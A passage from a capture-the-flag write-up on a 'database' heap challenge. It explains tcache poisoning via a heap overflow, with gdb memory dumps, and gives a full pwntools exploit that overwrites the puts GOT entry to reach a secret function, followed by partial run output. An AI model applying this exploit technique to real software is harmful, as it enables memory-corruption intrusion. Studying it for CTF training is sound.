<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Total items: 2
</span></span><span style="display:flex;"><span>0x5555556022c0(head)-&gt;0x00005555556022e0-&gt;NULL
</span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see on address <code>0x5555556022c0</code>, the tcache stored a pointer to the next cache, so that when we do <code>malloc(0x10)</code>, tcache will remove its curent head and move the head to its next pointer</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Before
</span></span><span style="display:flex;"><span>Total items: 2
</span></span><span style="display:flex;"><span>0x5555556022c0(head)-&gt;0x00005555556022e0-&gt;NULL
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>After malloc(0x10)
</span></span><span style="display:flex;"><span>0x5555556022c0 address will be used as the new malloc chunk address
</span></span><span style="display:flex;"><span>Total items: 1
</span></span><span style="display:flex;"><span>0x00005555556022e0(head)-&gt;NULL
</span></span></code></pre></td></tr></table>
</div>
</div><p>What happen if we use the heap-overflow to overwrite the tcache pointer? For example, imagine that the current heap chunk is like below</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>0x555555602290	0x0000000000000000	0x0000000000000021	........!.......
</span></span><span style="display:flex;"><span>0x5555556022a0	0x6161616161616161	0x0a61616161616161	aaaaaaaaaaaaaaa.
</span></span><span style="display:flex;"><span>0x5555556022b0	0x0000000000000000	0x0000000000000021	........!.......
</span></span><span style="display:flex;"><span>0x5555556022c0	0x00005555556022e0	0x0000555555602010	.<span style="color:#c30">&#34;`UUU... `UUU..	 &lt;-- tcachebins[0x20][0/2]
</span></span></span><span style="display:flex;"><span><span style="color:#c30">0x5555556022d0	0x0000000000000000	0x0000000000000021	........!.......
</span></span></span><span style="display:flex;"><span><span style="color:#c30">0x5555556022e0	0x0000000000000000	0x0000555555602010	......... `UUU..	 &lt;-- tcachebins[0x20][1/2]
</span></span></span><span style="display:flex;"><span><span style="color:#c30">...
</span></span></span><span style="display:flex;"><span><span style="color:#c30">
</span></span></span><span style="display:flex;"><span><span style="color:#c30">Tcache bins:
</span></span></span><span style="display:flex;"><span><span style="color:#c30">Total items: 2
</span></span></span><span style="display:flex;"><span><span style="color:#c30">0x5555556022c0(head)-&gt;0x00005555556022e0-&gt;NULL
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>With <code>update_item</code>, let say we want to read <code>0x28</code> string, and we input <code>0x6161616161616161+0x6161616161616161+0x0000000000000000+0x0000000000000021+0xdeadbeefdeadbabe</code></p>
<p>The chunk after that update will be like below:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>0x555555602290	0x0000000000000000	0x0000000000000021	........!.......
</span></span><span style="display:flex;"><span>0x5555556022a0	0x6161616161616161	0x0a61616161616161	aaaaaaaaaaaaaaa.
</span></span><span style="display:flex;"><span>0x5555556022b0	0x0000000000000000	0x0000000000000021	........!.......
</span></span><span style="display:flex;"><span>0x5555556022c0	0xdeadbeefdeadbabe	0x0000555555602010	.<span style="color:#c30">&#34;`UUU... `UUU..	 &lt;-- tcachebins[0x20][0/2]
</span></span></span><span style="display:flex;"><span><span style="color:#c30">0x5555556022d0	0x0000000000000000	0x0000000000000021	........!.......
</span></span></span><span style="display:flex;"><span><span style="color:#c30">0x5555556022e0	0x0000000000000000	0x0000555555602010	......... `UUU..
</span></span></span><span style="display:flex;"><span><span style="color:#c30">...
</span></span></span><span style="display:flex;"><span><span style="color:#c30">
</span></span></span><span style="display:flex;"><span><span style="color:#c30">Tcache bins:
</span></span></span><span style="display:flex;"><span><span style="color:#c30">Total items: 2
</span></span></span><span style="display:flex;"><span><span style="color:#c30">0x5555556022c0(head)-&gt;0xdeadbeefdeadbabe-&gt;...
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see, we can overwrite the tcache next pointer. That means we can control the allocated chunk address during calling the malloc. Take the above example, if we call <code>malloc(0x10)</code> twice, the second malloc chunk address will be stored at <code>0xdeadbeefdeadbabe</code>
This is the bug that we can use to solve the challenge.</p>
<h4 id="solution">Solution <a href="#solution" class="anchor">#</a></h4>
<p>My idea is to overwrite the <code>puts</code> GOT value to <code>secret</code> address with the heap-overflow bug, so that when we call <code>leave</code>, the <code>puts</code> will print the flag. To achieve that, my plan is:</p>
<ul>
<li>Create three items with size 0x10 via <code>insert_item</code></li>
<li>Free the second and third element via <code>delete_item</code></li>
<li>Heap overflow via <code>update_item</code> on the first item, with goals to replace the tcache next pointer to <code>puts</code> GOT address</li>
<li>Create one item with size 0x10 via <code>insert_item</code>.</li>
<li>Create one more item with size 0x10 and the stored string is the <code>secret</code> address via <code>insert_item</code>. This item will be stored at <code>puts</code> GOT address, and because the string is <code>secret</code> address, now, whenever the binary call <code>puts</code>, it will be resolved to <code>secret</code> instead.</li>
<li>Call <code>leave</code> and it will print the flag.</li>
</ul>
<p>Below is the solver:</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> p64, u64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>arch <span style="color:#555">=</span> <span style="color:#c30">&#39;amd64&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>encoding <span style="color:#555">=</span> <span style="color:#c30">&#39;latin&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>log_level <span style="color:#555">=</span> <span style="color:#c30">&#39;INFO&#39;</span>
</span></span><span style="display:flex;"><span>warnings<span style="color:#555">.</span>simplefilter(<span style="color:#c30">&#34;ignore&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#c30">+-----------------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#c30">| 1. Show all data            |
</span></span></span><span style="display:flex;"><span><span style="color:#c30">| 2. Insert a element         |
</span></span></span><span style="display:flex;"><span><span style="color:#c30">| 3. Update a element         |
</span></span></span><span style="display:flex;"><span><span style="color:#c30">| 4. Remove a element         |
</span></span></span><span style="display:flex;"><span><span style="color:#c30">| 5. Exit                     |
</span></span></span><span style="display:flex;"><span><span style="color:#c30">+-----------------------------+
</span></span></span><span style="display:flex;"><span><span style="color:#c30">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">insert_item</span>(r, length, data):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;choice =&gt; &#39;</span>, <span style="color:#366">str</span>(<span style="color:#f60">2</span>)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;of string =&gt; &#39;</span>, <span style="color:#366">str</span>(length)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;to save =&gt; &#39;</span>, data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">update_item</span>(r, index, length, data):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;choice =&gt; &#39;</span>, <span style="color:#366">str</span>(<span style="color:#f60">3</span>)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;of element =&gt; &#39;</span>, <span style="color:#366">str</span>(index)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;of string =&gt; &#39;</span>, <span style="color:#366">str</span>(length)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;string =&gt; &#39;</span>, data)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">delete_item</span>(r, index):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;choice =&gt; &#39;</span>, <span style="color:#366">str</span>(<span style="color:#f60">4</span>)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;index of element =&gt; &#39;</span>, <span style="color:#366">str</span>(index)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">leave</span>(r):
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;choice =&gt; &#39;</span>, <span style="color:#366">str</span>(<span style="color:#f60">5</span>)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    log<span style="color:#555">.</span>info(r<span style="color:#555">.</span>readrepeat(<span style="color:#f60">1</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#555">=</span> ELF(<span style="color:#c30">&#39;database&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>main_addr <span style="color:#555">=</span> elf<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;main&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r <span style="color:#555">=</span> remote(<span style="color:#c30">&#39;binary.challs.pragyanctf.tech&#39;</span>, <span style="color:#f60">6004</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;This might help: &#39;</span>)
</span></span><span style="display:flex;"><span>leaked_main <span style="color:#555">=</span> <span style="color:#366">int</span>(r<span style="color:#555">.</span>recvline()<span style="color:#555">.</span>strip(), <span style="color:#f60">16</span>)
</span></span><span style="display:flex;"><span>elf<span style="color:#555">.</span>address <span style="color:#555">=</span> leaked_main <span style="color:#555">-</span> main_addr
</span></span><span style="display:flex;"><span>secret_addr <span style="color:#555">=</span> elf<span style="color:#555">.</span>symbols[<span style="color:#c30">&#39;secret&#39;</span>]
</span></span><span style="display:flex;"><span>puts_got <span style="color:#555">=</span> elf<span style="color:#555">.</span>got[<span style="color:#c30">&#39;puts&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Leaked main: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(leaked_main)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Base addr  : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(elf<span style="color:#555">.</span>address)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Secret addr: </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(secret_addr)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>log<span style="color:#555">.</span>info(<span style="color:#c30">f</span><span style="color:#c30">&#39;Puts got   : </span><span style="color:#a00">{</span><span style="color:#366">hex</span>(puts_got)<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>insert_item(r, <span style="color:#f60">16</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">16</span>)
</span></span><span style="display:flex;"><span>insert_item(r, <span style="color:#f60">16</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">16</span>)
</span></span><span style="display:flex;"><span>insert_item(r, <span style="color:#f60">16</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">16</span>)
</span></span><span style="display:flex;"><span>delete_item(r, <span style="color:#f60">2</span>)
</span></span><span style="display:flex;"><span>delete_item(r, <span style="color:#f60">1</span>)
</span></span><span style="display:flex;"><span>update_item(r, <span style="color:#f60">0</span>, <span style="color:#f60">16</span><span style="color:#555">+</span><span style="color:#f60">8</span><span style="color:#555">+</span><span style="color:#f60">8</span><span style="color:#555">+</span><span style="color:#f60">8</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">16</span><span style="color:#555">+</span>p64(<span style="color:#f60">0</span>)<span style="color:#555">+</span>p64(<span style="color:#f60">0x21</span>)<span style="color:#555">+</span>p64(puts_got))
</span></span><span style="display:flex;"><span>insert_item(r, <span style="color:#f60">16</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;a&#39;</span><span style="color:#555">*</span><span style="color:#f60">16</span>)
</span></span><span style="display:flex;"><span>insert_item(r, <span style="color:#f60">16</span>, p64(secret_addr))
</span></span><span style="display:flex;"><span>leave(r)
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#555">[</span>x<span style="color:#555">]</span> Opening connection to binary.challs.pragyanctf.tech on port <span style="color:#f60">6004</span>
</span></span><span style="display:flex;"><span><span style="color:#555">[</span>x<span style="color:#555">]</span> Opening connection to binary.challs.pragyanctf.tech on port 6004: Trying 159.203.157.131
</span></span><span style="display:flex;"><span><span style="color:#555">[</span>+<span style="color:#555">]</span> Opening connection to binary.challs.pragyanctf.tech on port 6004: Done
</span></span><span style="display:flex;"><span><span style="color:#555">[</span>*<span style="color:#555">]</span> Leaked main: 0x562483ff3275
</span></span><span style="display:flex;"><span><span style="color:#555">[</span>*<span style="color:#555">]</span> Base addr  : 0x562483ff2000
</span></span><span style="display:flex;"><span><span style="color:#555">[</span>*<span style="color:#555">]</span> Secret addr: 0x562483ff3262
